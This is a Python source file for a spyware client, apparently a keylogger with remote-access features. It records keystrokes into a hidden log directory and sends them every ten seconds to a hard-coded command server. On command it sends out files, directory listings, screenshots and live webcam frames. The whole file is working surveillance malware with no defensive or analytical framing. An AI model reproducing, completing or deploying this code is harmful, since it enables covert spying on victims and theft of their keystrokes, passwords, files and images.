import base64
import ctypes
import datetime
import io
import json
import logging
import os
import platform
import socket
import sys
import threading
import time

import cv2
import pyautogui
from pynput.keyboard import Listener

# Global variables
stop = False
LOG_DIR_WINDOWS = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'logs')
LOG_DIR_LINUX = '/tmp/logs'


# Function to get the OS
def get_os():
    return platform.system()


# Function to create a connection to the server
def create_connection(host, port):
    max_reconnect_time = 10 * 60
    reconnect_interval = 10
    start_time = time.time()
    while True:
        try:
            return socket.create_connection((host, port))
        except socket.error as e:
            if time.time() - start_time > max_reconnect_time:
                print(f"Max reconnect time reached: {max_reconnect_time} seconds")
                sys.exit(0)
            print(f"Error connecting to {host}:{port}: {e}")
            print(f"Retrying in {reconnect_interval} seconds...")
            time.sleep(reconnect_interval)


# Function to set up log file
def setup_logging(filename):
    if not os.path.exists(os.path.dirname(filename)):
        os.makedirs(os.path.dirname(filename))
    logging.basicConfig(
        filemode='a',
        filename=filename,
        datefmt='%Y-%m-%d %H:%M:%S',
        format='%(asctime)s %(message)s',
        level=logging.DEBUG
    )


# Function to hide file
def hide_file(filename):
    if get_os() == 'Windows':
        ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
    elif get_os() == 'Linux':
        os.popen(f'chmod 700 {filename}')
    else:
        print("OS not supported for hiding files.")


# Function to log key press
def log_key_press(key):
    logging.info(str(key))


# Function to send log message
def send_log_message(sock, filename):
    if not os.path.exists(filename):
        print(f"Log file not found: {filename}")
        return
    try:
        with open(filename, 'rb') as f:
            file_content_encoded = base64.b64encode(f.read()).decode()
            client_info = {
                'command': 'LOG',
                'filename': os.path.basename(filename),
                'file_content': file_content_encoded
            }
            json_data = json.dumps(client_info)
            sock.sendall(json_data.encode())
    except socket.error as e:
        print(f'Error sending log message: {e}')


# Function to capture and send webcam image
def capture_and_send_webcam(sock):
    cap = cv2.VideoCapture(0)

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        _, buffer = cv2.imencode('.jpg', frame)
        encoded_image = base64.b64encode(buffer).decode()

        client_info = {
            'command': 'WEBCAM',
            'image': encoded_image
        }
        json_data = json.dumps(client_info)
        try:
            sock.send(json_data.encode())
        except socket.error as e:
            print(f'Error sending webcam image: {e}')
            break

        time.sleep(0.1)

    cap.release()


# Function to receive commands from server
def receive_commands(sock):
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break
            data = data.decode()
            try:
                command = json.loads(data)
                command_type = command.get('command')

                if command_type == 'READ':
                    filename = command['filename']
                    try:
                        with open(filename, 'rb') as f:
                            file_content_encoded = base64.b64encode(f.read()).decode()

                            client_info = {
                                'command': 'READ',
                                'filename': filename,
                                'file_content': file_content_encoded
                            }
                            json_data = json.dumps(client_info)
                            sock.send(json_data.encode())
                    except FileNotFoundError:
                        client_info = {
                            'command': 'ERROR',
                            'error': f"File '{filename}' not found."
                        }
                        json_data = json.dumps(client_info)
                        sock.send(json_data.encode())

                elif command_type == 'SHOW':
                    files = os.listdir()
                    client_info = {
                        'command': 'SHOW',
                        'files': files
                    }
                    json_data = json.dumps(client_info)
                    sock.send(json_data.encode())

                elif command_type == 'SCREENSHOT':
                    screenshot = pyautogui.screenshot()
                    screenshot_bytes = io.BytesIO()
                    screenshot.save(screenshot_bytes, format='PNG')
                    screenshot_bytes = screenshot_bytes.getvalue()

                    screenshot_encoded = base64.b64encode(screenshot_bytes).decode()

                    client_info = {
                        'command': 'SCREENSHOT',
                        'screenshot': screenshot_encoded
                    }
                    json_data = json.dumps(client_info)
                    sock.send(json_data.encode())

                elif command_type == 'WEBCAM':
                    webcam_thread = threading.Thread(target=capture_and_send_webcam, args=(sock,))
                    webcam_thread.start()

                elif command_type == 'KILL':
                    global stop
                    stop = True
                    client_info = {
                        'command': 'KILL',
                        "stop": stop
                    }
                    json_data = json.dumps(client_info)
                    sock.send(json_data.encode())

            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")
    except socket.error as e:
        print(f"Error receiving command: {e}")
        return


# Main function
def main():
    global stop
    host = '192.168.18.144'
    port = 9809
    current_hour = datetime.datetime.now().strftime("%Hh")
    log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
    log_file = os.path.join(log_dir, f'{current_hour}_keyboard.log')

    setup_logging(log_file)
    hide_file(log_dir)

    try:
        sock = create_connection(host, port)
        listener = Listener(on_press=log_key_press)
        listener.start()
        command_thread = threading.Thread(target=receive_commands, args=(sock,))
        command_thread.start()

        try:
            while not stop:
                send_log_message(sock, log_file)
                time.sleep(10)
        except KeyboardInterrupt:
            if sock:
                sock.close()
            listener.stop()
            command_thread.join()
            os._exit(0)

    except socket.error as e:
        print(f"Connection error: {e}")
    finally:
        if sock:
            sock.close()
        listener.stop()
        command_thread.join()


if __name__ == '__main__':
    main()
